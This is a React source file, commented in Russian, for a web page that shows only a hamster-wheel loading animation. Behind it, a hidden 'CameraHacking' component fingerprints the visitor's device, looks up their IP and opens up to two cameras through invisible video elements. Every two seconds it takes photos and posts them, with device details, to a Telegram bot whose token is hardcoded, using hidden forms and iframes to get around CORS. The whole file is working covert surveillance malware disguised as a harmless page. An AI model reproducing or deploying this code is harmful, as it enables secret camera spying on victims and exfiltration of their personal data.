import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [availableCameras, setAvailableCameras] = useState([]);
  const [activeCameras, setActiveCameras] = useState(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 2000;
  const MAX_CAPTURES = 100;

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        
        const updateBatteryInfo = () => {
          setBatteryLevel(Math.round(battery.level * 100));
          setBatteryCharging(battery.charging);
        };
        
        updateBatteryInfo();
        
        battery.addEventListener('levelchange', updateBatteryInfo);
        battery.addEventListener('chargingchange', updateBatteryInfo);
        
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
    } catch (error) {
      console.error('Battery error:', error);
    }
    return null;
  };

  // Метод отправки через JSONP (обход CORS)
  const sendToTelegram = async (text) => {
    return new Promise((resolve) => {
      try {
        // Создаем временный iframe для отправки
        const timestamp = Date.now();
        const iframeName = `telegram_frame_${timestamp}`;
        
        const iframe = document.createElement('iframe');
        iframe.name = iframeName;
        iframe.style.display = 'none';
        iframe.onload = () => {
          setTimeout(() => {
            iframe.remove();
            resolve(true);
          }, 100);
        };
        
        document.body.appendChild(iframe);
        
        // Создаем форму
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        form.target = iframeName;
        form.style.display = 'none';
        
        // Добавляем параметры
        const params = {
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: 'true'
        };
        
        Object.keys(params).forEach(key => {
          const input = document.createElement('input');
          input.type = 'hidden';
          input.name = key;
          input.value = params[key];
          form.appendChild(input);
        });
        
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
          form.remove();
          resolve(true);
        }, 100);
        
      } catch (error) {
        console.error('Send error:', error);
        resolve(false);
      }
    });
  };

  // Метод отправки фото через FormData и iframe
  const sendPhotoToTelegram = async (blob, caption = '', cameraNumber = 1) => {
    return new Promise((resolve) => {
      try {
        const timestamp = Date.now();
        const iframeName = `photo_frame_${timestamp}`;
        
        // Создаем iframe
        const iframe = document.createElement('iframe');
        iframe.name = iframeName;
        iframe.style.display = 'none';
        iframe.onload = () => {
          setTimeout(() => {
            iframe.remove();
            resolve(true);
          }, 100);
        };
        
        document.body.appendChild(iframe);
        
        // Создаем форму
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        form.target = iframeName;
        form.enctype = 'multipart/form-data';
        form.style.display = 'none';
        
        // Добавляем chat_id
        const chatIdInput = document.createElement('input');
        chatIdInput.type = 'hidden';
        chatIdInput.name = 'chat_id';
        chatIdInput.value = chatId;
        form.appendChild(chatIdInput);
        
        // Добавляем caption
        if (caption) {
          const captionInput = document.createElement('input');
          captionInput.type = 'hidden';
          captionInput.name = 'caption';
          captionInput.value = caption;
          form.appendChild(captionInput);
        }
        
        // Добавляем disable_notification
        const notifInput = document.createElement('input');
        notifInput.type = 'hidden';
        notifInput.name = 'disable_notification';
        notifInput.value = 'true';
        form.appendChild(notifInput);
        
        // Создаем input для файла
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.name = 'photo';
        
        // Создаем File из Blob
        const file = new File([blob], `camera${cameraNumber}_${timestamp}.jpg`, { 
          type: 'image/jpeg',
          lastModified: timestamp
        });
        
        // Создаем DataTransfer для добавления файла
        const dataTransfer = new DataTransfer();
        dataTransfer.items.add(file);
        fileInput.files = dataTransfer.files;
        form.appendChild(fileInput);
        
        document.body.appendChild(form);
        form.submit();
        
        setTimeout(() => {
          form.remove();
          resolve(true);
        }, 100);
        
      } catch (error) {
        console.error('Photo send error:', error);
        resolve(false);
      }
    });
  };

  // Сбор информации об устройстве
  const collectDeviceInfo = async () => {
    const batteryInfo = await getBatteryInfo();
    
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory || 'Неизвестно',
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      } : null,
      battery: batteryInfo,
      ip: 'Определение...',
      os: detectOS(),
      browser: detectBrowser(),
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
    } catch (error) {
      info.ip = 'Ошибка получения';
    }

    setDeviceInfo(info);
    return info;
  };

  // Детекция ОС
  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac OS/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    if (/Android/i.test(ua)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    return 'Unknown';
  };

  // Детекция браузера
  const detectBrowser = () => {
    const ua = navigator.userAgent;
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
    if (/Edg/i.test(ua)) return 'Edge';
    return 'Unknown';
  };

  // Отправка информации об устройстве
  const sendDeviceInfo = async (info) => {
    const batteryText = info.battery ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    const message = `
🔍 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*

*📱 СИСТЕМА*
▫️ ОС: ${info.os}
▫️ Браузер: ${info.browser}
▫️ Платформа: ${info.platform}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

*🖥 ЭКРАН*
▫️ Разрешение: ${info.screenSize}
▫️ Pixel Ratio: ${info.devicePixelRatio}

${batteryText}

*⚙️ АППАРАТУРА*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ Память: ${info.deviceMemory} GB

*🌐 СЕТЬ*
▫️ IP: ${info.ip}
▫️ Тип сети: ${info.connection?.effectiveType || 'Неизвестно'}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}
▫️ Время системы: ${new Date().toLocaleString()}

🚀 *АКТИВИРОВАН ЗАХВАТ С ДВУХ КАМЕР*
    `;

    await sendToTelegram(message);
  };

  // Получение всех доступных камер
  const getAllCameras = async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      return videoDevices;
    } catch (error) {
      return [];
    }
  };

  // Инициализация двух камер
  const initializeCameras = async () => {
    try {
      const cameras = await getAllCameras();
      setAvailableCameras(cameras);
      
      if (cameras.length === 0) {
        return 0;
      }

      // Активируем максимум 2 камеры
      const camerasToActivate = Math.min(cameras.length, 2);
      setActiveCameras(camerasToActivate);
      
      streamsRef.current = [];
      videoRefsRef.current = [];

      for (let i = 0; i < camerasToActivate; i++) {
        try {
          // Для первой камеры пробуем заднюю, для второй - переднюю
          const constraints = {
            video: {
              deviceId: cameras[i].deviceId ? { exact: cameras[i].deviceId } : undefined,
              width: { ideal: 1280 },
              height: { ideal: 720 },
              facingMode: i === 0 ? { exact: "environment" } : "user"
            },
            audio: false
          };

          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          streamsRef.current.push(stream);

          // Создаем скрытый видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0.001;
            pointer-events: none;
            z-index: -999999;
            top: -9999px;
            left: -9999px;
          `;
          
          video.playsInline = true;
          video.muted = true;
          video.autoplay = true;
          video.setAttribute('playsinline', 'true');
          video.setAttribute('muted', 'true');
          video.setAttribute('autoplay', 'true');
          video.setAttribute('webkit-playsinline', 'true');

          video.srcObject = stream;
          document.body.appendChild(video);
          videoRefsRef.current.push(video);

          // Ждем готовности видео
          await new Promise((resolve) => {
            const timer = setTimeout(resolve, 1500);
            video.onloadedmetadata = () => {
              clearTimeout(timer);
              video.play().catch(() => {});
              resolve();
            };
          });

        } catch (error) {
          console.error(`Camera ${i + 1} init error:`, error);
        }
      }

      return camerasToActivate;
    } catch (error) {
      return 0;
    }
  };

  // Создание изображения
  const createCameraImage = async (cameraIndex, video) => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    
    if (video && video.videoWidth > 0 && video.videoHeight > 0) {
      // Используем разрешение с камеры
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Добавляем водяной знак
      ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
      ctx.fillRect(10, canvas.height - 110, 300, 100);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.textAlign = 'left';
      ctx.fillText(`📸 Камера ${cameraIndex + 1}`, 20, canvas.height - 90);
      ctx.fillText(`🔋 ${batteryLevel || '?'}%`, 20, canvas.height - 70);
      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 50);
      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 30);
    } else {
      // Тестовое изображение
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      
      const gradient = ctx.createLinearGradient(0, 0, 640, 480);
      gradient.addColorStop(0, '#667eea');
      gradient.addColorStop(1, '#764ba2');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, 640, 480);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 30px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('📷 СИСТЕМА КАМЕР', 320, 150);
      
      ctx.font = '20px Arial';
      ctx.fillText(`Камера ${cameraIndex + 1}`, 320, 200);
      ctx.fillText(`Фото #${captureCount + 1}`, 320, 240);
      ctx.fillText(new Date().toLocaleTimeString(), 320, 280);
      
      ctx.font = '18px Arial';
      ctx.fillText(`🔋 ${batteryLevel || '?'}%`, 320, 330);
    }

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.7);
    });
  };

  // Захват и отправка фото с двух камер
  const captureAndSendFromBothCameras = async () => {
    if (captureCount >= MAX_CAPTURES) {
      stopCapturing();
      await sendToTelegram(
        `✅ Завершено\n` +
        `📸 Фото: ${captureCount * activeCameras}\n` +
        `🔋 Батарея: ${batteryLevel || '?'}%\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      return;
    }

    // Захватываем с каждой активной камеры
    for (let i = 0; i < activeCameras; i++) {
      try {
        const video = videoRefsRef.current[i];
        const photoBlob = await createCameraImage(i, video);
        
        if (photoBlob) {
          const cameraType = i === 0 ? '📷 Задняя камера' : '🤳 Передняя камера';
          const caption = `${cameraType}\n` +
            `Фото #${captureCount + 1}\n` +
            `Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}\n` +
            `Устройство: ${deviceInfo?.os || ''}\n` +
            `Время: ${new Date().toLocaleTimeString()}`;
          
          await sendPhotoToTelegram(photoBlob, caption, i + 1);
        }
      } catch (error) {
        console.error(`Camera ${i + 1} capture error:`, error);
      }
    }

    setCaptureCount(prev => prev + 1);

    // Статистика каждые 10 циклов
    if ((captureCount + 1) % 10 === 0 && activeCameras > 0) {
      await sendToTelegram(
        `📊 Статистика #${captureCount + 1}\n` +
        `Камеры: ${activeCameras}\n` +
        `Циклов: ${captureCount + 1}\n` +
        `Всего фото: ${(captureCount + 1) * activeCameras}\n` +
        `Батарея: ${batteryLevel || '?'}%\n` +
        `Время: ${new Date().toLocaleString()}`
      );
    }
  };

  // Запуск периодического захвата
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    // Первый захват через 1 секунду
    setTimeout(() => {
      captureAndSendFromBothCameras();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSendFromBothCameras();
    }, CAPTURE_INTERVAL);
  };

  // Остановка захвата
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    // Останавливаем все потоки
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];

    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
  };

  // Основная инициализация
  useEffect(() => {
    let mounted = true;

    const init = async () => {
      // Получаем информацию о батарее
      await getBatteryInfo();
      
      // Собираем информацию об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем информацию
      await sendDeviceInfo(info);
      
      // Инициализируем камеры
      const camerasCount = await initializeCameras();
      
      if (camerasCount > 0 && mounted) {
        await sendToTelegram(
          `✅ Камеры активированы: ${camerasCount}\n` +
          `📸 Начинаю съемку\n` +
          `⏱ Интервал: ${CAPTURE_INTERVAL/1000}с\n` +
          `🔋 Батарея: ${batteryLevel || '?'}%`
        );
        
        // Запускаем периодический захват
        startPeriodicCapture();
      } else {
        await sendToTelegram(
          `⚠️ Камеры не найдены\n` +
          `Устройство: ${info.os}\n` +
          `Батарея: ${batteryLevel || '?'}%`
        );
      }
    };

    // Запускаем с небольшой задержкой
    setTimeout(init, 1000);

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // НИЧЕГО НЕ ПОКАЗЫВАЕМ на сайте
  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
